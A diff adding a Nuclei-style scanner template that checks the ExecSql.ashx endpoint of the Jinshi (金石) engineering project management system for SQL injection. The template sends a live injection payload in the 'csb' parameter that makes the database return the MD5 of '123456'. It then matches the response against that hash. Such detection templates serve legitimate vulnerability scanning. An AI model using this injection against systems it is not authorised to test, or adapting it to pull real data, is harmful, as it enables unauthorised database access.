@@ -1,0 +1,28 @@
+id: Jinshi-ExecSql-sqli
+
+info:
+  name: Jinshi-ExecSql-sqli
+  author: HuanXiong
+  severity: high
+  description: 金石工程项目管理系统ExecSqlSQL注入
+
+  tags: SQL Injection
+
+http:
+  - raw:
+    - |
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Accept-Encoding: gzip 
+
+    - |
+      GET /Com/ExecSql.ashx?atype=SetFzr&csb=1|(select%20substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))-- HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+         - 'status_code==200 && contains_all(body,"e10adc3949ba59abbe56e057f20f883e")'
